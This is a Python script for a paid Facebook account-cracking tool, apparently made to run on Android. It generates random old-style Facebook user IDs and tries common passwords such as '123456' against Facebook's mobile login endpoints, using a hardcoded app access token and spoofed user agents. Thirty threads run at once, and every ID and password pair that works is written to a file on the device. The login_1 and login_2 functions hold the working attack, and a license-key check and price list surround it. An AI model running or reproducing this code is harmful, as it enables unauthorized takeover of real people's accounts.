import os
import re
import time
import uuid
import hashlib
import random
import string
import requests
import sys
import json
import urllib
import subprocess
from bs4 import BeautifulSoup
from random import randint as rr
from concurrent.futures import ThreadPoolExecutor as tred
from os import system
from datetime import datetime

import os, sys

# Ensure required modules are installed
modules = ['requests', 'urllib3', 'mechanize', 'rich']
for module in modules:
    try:
        __import__(module)
    except ImportError:
        os.system(f'pip install {module}')

# Suppress InsecureRequestWarning
from requests.exceptions import ConnectionError
from requests import api, models, sessions
requests.urllib3.disable_warnings()

# ---- Colors (Matched with Orange Theme) ----
ORANGE = "\033[38;5;208m"
GREEN = "\033[1;32m"
CYAN = "\033[1;36m"
YELLOW = "\033[1;33m"
RED = "\033[1;31m"
WHITE = "\033[1;37m"
MAGENTA = "\033[1;35m"
BLUE = "\033[1;34m"
RESET = "\033[0m"
PINK = "\033[38;5;206m"
GOLD = "\033[38;5;220m"

# Global variables
method = []
oks = []
cps = []
loop = 0
user = []
CONFIG_FILE = ".raja_approval.txt"

def windows():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5, 7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8, 12)))}.0.{str(random.choice(range(552, 661)))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {str(random.choice(range(5, 7)))}.{str(random.choice(['2', '1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2', '1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12, 42)))}.0.{str(random.choice(range(742, 2200)))}.{str(random.choice(range(1, 120)))} Safari/{cz}"
    D = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1, 7120)))}.0 Safari/537.36"
    return random.choice([A, B, C, D])

def window1():
    aV = str(random.choice(range(10, 20)))
    A = f"Mozilla/5.0 (Windows; U; Windows NT {random.choice(range(6, 11))}.0; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.0 Safari/534.{aV}"
    bV = str(random.choice(range(1, 36)))
    bx = str(random.choice(range(34, 38)))
    bz = f'5{bx}.{bV}'
    B = f"Mozilla/5.0 (Windows NT {random.choice(range(6, 11))}.{random.choice(['0', '1'])}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{bz}"
    cV = str(random.choice(range(1, 36)))
    cx = str(random.choice(range(34, 38)))
    cz = f'5{cx}.{cV}'
    C = f"Mozilla/5.0 (Windows NT 6.{random.choice(['0', '1', '2'])}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{random.choice(range(80, 122))}.0.{random.choice(range(4000, 7000))}.{random.choice(range(50, 200))} Safari/{cz}"
    latest_build = rr(6000, 9000)
    latest_patch = rr(100, 200)
    D = f"Mozilla/5.0 (Windows NT {random.choice(['10.0', '11.0'])}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.{latest_build}.{latest_patch} Safari/537.36"
    return random.choice([A, B, C, D])

sys.stdout.write('\x1b]2;KAMAL TOOL \x07')

# --- Main PAID Banner (Orange Theme Matched) ---
def paid_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(ORANGE + "+======================================================+" + RESET)
    print(ORANGE)
    print(r"   ██████╗   █████╗   ██╗ ██████╗ ")
    print(r"   ██╔══██╗ ██╔══██╗  ██║ ██╔══██╗")
    print(r"   ██████╔╝ ███████║  ██║ ██║  ██║")
    print(r"   ██╔═══╝  ██╔══██║  ██║ ██║  ██║")
    print(r"   ██║      ██║  ██║  ██║ ██████╔╝")
    print(r"   ╚═╝      ╚═╝  ╚═╝  ╚═╝ ╚═════╝ ")
    print(RESET)
    print(ORANGE + "+======================================================+" + RESET)
    print(GOLD + "            >>  P A I D   T O O L  <<" + RESET)
    print(YELLOW + "          [*] DEVELOPER : KAMAL VAU [*]" + RESET)
    print(ORANGE + "+======================================================+" + RESET + "\n")
    print(PINK + "  [✦] Version 14.0 | VIP USER [✦]" + RESET)
    print(ORANGE + "-------------------------------------------------------" + RESET)
    print(WHITE + "  🔰 1 Weeks          : " + GOLD + "2 Dollar$" + RESET)
    print(WHITE + "  🔰 2 Weeks          : " + GOLD + "4 Dollar$" + RESET)
    print(WHITE + "  🔰 3 Weeks          : " + GOLD + "15 Dollar$" + RESET)
    print(WHITE + "  🔥 Offer 1 Month    : " + GREEN + "25 Dollar" + RESET)
    print(ORANGE + "-------------------------------------------------------" + RESET)

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('1000000000', '100000000', '10000000', '1000000', '1000001', '1000002', '1000003', '1000004', '1000005')):
            return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009', '100001')):
            return '2010'
        if uid.startswith(('100002', '100003')):
            return '2011'
        if uid.startswith('100004'):
            return '2012'
        if uid.startswith(('100005', '100006')):
            return '2013'
        if uid.startswith(('100007', '100008')):
            return '2014'
        if uid.startswith('100009'):
            return '2015'
        if uid.startswith('10001'):
            return '2016'
        if uid.startswith('10002'):
            return '2017'
        if uid.startswith('10003'):
            return '2018'
        if uid.startswith('10004'):
            return '2019'
        if uid.startswith('10005'):
            return '2020'
        if uid.startswith('10006'):
            return '2021'
        if uid.startswith(('10007', '10008')):
            return '2022'
        if uid.startswith('10009'):
            return '2023'
        return ''
    elif len(uid) in (9, 10):
        return '2008'
    elif len(uid) == 8:
        return '2007'
    elif len(uid) == 7:
        return '2006'
    elif len(uid) == 14 and uid.startswith('61'):
        return '2024'
    else:
        return ''

def clear():
    os.system('clear')

def linex():
    print(ORANGE + '─────────────────────────────────────────────────────' + RESET)

# --- Approval System ---
def check_approval():
    try:
        uuid_val = str(os.geteuid()) + str(os.getlogin())
    except:
        uuid_val = "kamal_device"
    
    unique_key = "KAMAL-" + str(abs(hash(uuid_val)) % 1000000)

    if os.path.exists(CONFIG_FILE):
        with open(CONFIG_FILE, "r") as f:
            saved_key = f.read().strip()
        if saved_key == unique_key:
            try:
                res = requests.get("https://raw.githubusercontent.com/rajavau379-pixel/RajA-VaU-YT/refs/heads/main/key.txt", timeout=5)
                if unique_key in res.text:
                    return True
            except:
                return True

    paid_banner()
    print(YELLOW + "  [+] DEVICE APPROVAL PORTAL" + RESET)
    linex()
    print(f"{WHITE}  YOUR DEVICE KEY : {ORANGE}{unique_key}{RESET}")
    print(CYAN + "  (Copy this key and send to admin for approval)")
    linex()
    print(YELLOW + "  [⏳] Checking approval from GitHub server..." + RESET)
    
    for i in range(5, 0, -1):
        sys.stdout.write(f"\r  Verifying status... {i}s remaining")
        sys.stdout.flush()
        time.sleep(1)
    print("\n")
    
    try:
        response = requests.get("https://raw.githubusercontent.com/rajavau379-pixel/RajA-VaU-YT/refs/heads/main/key.txt", timeout=5)
        approved_keys = response.text
        
        if unique_key in approved_keys:
            with open(CONFIG_FILE, "w") as f:
                f.write(unique_key)
            print(GREEN + "  [✔] Key Approved Successfully! Access Granted." + RESET)
            time.sleep(2)
            return True
        else:
            print(RED + "  [X] Key Not Approved or Removed by Admin!" + RESET)
            if os.path.exists(CONFIG_FILE):
                os.remove(CONFIG_FILE)
            input(WHITE + "\n  Press Enter to return to menu..." + RESET)
            return False
    except:
        print(RED + "  [!] Network Connection Error!" + RESET)
        input(WHITE + "\n  Press Enter to return to menu..." + RESET)
        return False

def old_clone():
    paid_banner()
    print(ORANGE + "  [1] ALL SERIES" + RESET)
    print(ORANGE + "  [2] 100003/4 SERIES" + RESET)
    print(ORANGE + "  [3] 2009 SERIES" + RESET)
    print(RED + "  [0] BACK" + RESET)
    linex()
    _input = input(WHITE + "  CHOOSE : " + RESET)
    if _input in ('1', '01'):
        old_One()
    elif _input in ('2', '02'):
        old_Tow()
    elif _input in ('3', '03'):
        old_Tree()
    elif _input in ('0', '00'):
        menu()
    else:
        print(RED + "  OPTION NOT FOUND IN MENU..." + RESET)
        time.sleep(1)
        old_clone()

def old_One():
    user = []
    paid_banner()
    print(ORANGE + "  OLD CODE : 2010-2014" + RESET)
    ask = input(WHITE + "  SELECT : " + RESET)
    linex()
    paid_banner()
    print(ORANGE + "  EXAMPLE : 20000 / 30000 / 99999" + RESET)
    limit = input(WHITE + "  SELECT : " + RESET)
    linex()
    star = '10000'
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
        user.append(data)
    paid_banner()
    print(ORANGE + "  [1] METHOD 1" + RESET)
    print(ORANGE + "  [2] METHOD 2" + RESET)
    linex()
    meth = input(WHITE + "  CHOOSE (1/2): " + RESET).strip()
    with tred(max_workers=30) as pool:
        paid_banner()
        print(f"  TOTAL ID FROM CRACK : {limit}")
        print("  USE AIRPLANE MOD FOR GOOD RESULT")
        linex()
        for mal in user:
            uid = star + mal
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break

def old_Tow():
    user = []
    paid_banner()
    print(ORANGE + "  OLD CODE : 2010-2014" + RESET)
    linex()
    paid_banner()
    print(ORANGE + "  EXAMPLE : 20000 / 30000 / 99999" + RESET)
    limit = input(WHITE + "  TOTAL ID COUNT : " + RESET)
    linex()
    prefixes = ['100003', '100004']
    for _ in range(int(limit)):
        prefix = random.choice(prefixes)
        suffix = ''.join(random.choices('0123456789', k=9))
        uid = prefix + suffix
        user.append(uid)
    paid_banner()
    print(ORANGE + "  [1] METHOD A" + RESET)
    print(ORANGE + "  [2] METHOD B" + RESET)
    linex()
    meth = input(WHITE + "  CHOOSE (1/2): " + RESET).strip()
    with tred(max_workers=30) as pool:
        paid_banner()
        print(f"  TOTAL ID FROM CRACK : {limit}")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break

def old_Tree():
    user = []
    paid_banner()
    print(ORANGE + "  OLD CODE : 2009-2010" + RESET)
    linex()
    paid_banner()
    print(ORANGE + "  EXAMPLE : 20000 / 30000 / 99999" + RESET)
    limit = input(WHITE + "  TOTAL ID COUNT : " + RESET)
    linex()
    prefix = '1000004'
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        uid = prefix + suffix
        user.append(uid)
    paid_banner()
    print(ORANGE + "  [1] METHOD A" + RESET)
    print(ORANGE + "  [2] METHOD B" + RESET)
    linex()
    meth = input(WHITE + "  CHOOSE (1/2): " + RESET).strip()
    with tred(max_workers=30) as pool:
        paid_banner()
        print(f"  TOTAL ID FROM CRACK : {limit}")
        linex()
        for uid in user:
            if meth in ('1', 'A', 'a'):
                pool.submit(login_1, uid)
            elif meth in ('2', 'B', 'b'):
                pool.submit(login_2, uid)
            else:
                break

def login_1(uid):
    global loop
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;208m+\x1b[1;37m\x1b[38;5;208m(\x1b[1;37mKAMAL OK ID-M1\x1b[38;5;208m)\x1b[1;37m\x1b[38;5;208m(\x1b[38;5;220m{loop}\x1b[38;5;208m)(\x1b[38;5;46m{len(oks)}\x1b[38;5;208m)")
        sys.stdout.flush()
        for pw in ('123456', '1234567', '12345678', '123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': window1(),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'X-FB-HTTP-Engine': 'Liger'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res or 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r{GREEN}[KAMAL-OK] {uid} | {pw}{RESET}")
                open('/sdcard/KAMAL-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except:
        time.sleep(5)

def login_2(uid):
    global loop
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;208m+\x1b[1;37m(\x1b[1;37mKAMAL -M2\x1b[38;5;208m)(\x1b[38;5;220m{loop}\x1b[38;5;208m)(\x1b[38;5;46m{len(oks)}\x1b[38;5;208m)")
        sys.stdout.flush()
        for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
            with requests.Session() as session:
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&method=GET&locale=en_US&client_country_code=US&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32"
                po = session.get(url).json()
                if 'session_key' in str(po):
                    print(f"\r\r{GREEN}[KAMAL-OK] {uid} | {pw}{RESET}")
                    open('/sdcard/KAMAL-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        loop += 1
    except:
        pass

# --- Main Program Menu ---
def menu():
    while True:
        paid_banner()
        print(ORANGE + "  [1] Contact admin" + RESET)
        print(GOLD + "  [2] Check Approval" + RESET)
        print(RED + "  [3] Exit" + RESET)
        linex()

        choice = input(WHITE + "  Select Option (1/2/3): " + RESET).strip()

        if choice == "1":
            whatsapp_link = "https://wa.me/message/GIVJS4M6JWDXD1"
            print(ORANGE + f"\n  Redirecting to Inbox: {whatsapp_link}" + RESET)
            try:
                os.system(f"am start {whatsapp_link} > /dev/null 2>&1")
            except:
                pass
            input(WHITE + "\n  Press Enter to continue..." + RESET)
        elif choice == "2":
            if check_approval():
                old_clone()
        elif choice == "3":
            print(RED + "\n  Exiting... Good bye!" + RESET)
            sys.exit()
        else:
            print(RED + "  Invalid choice! Please try again." + RESET)
            time.sleep(1)

if __name__ == "__main__":
    try:
        menu()
    except KeyboardInterrupt:
        print(RED + "\n\n  Interrupted. Good bye!" + RESET)
        sys.exit()
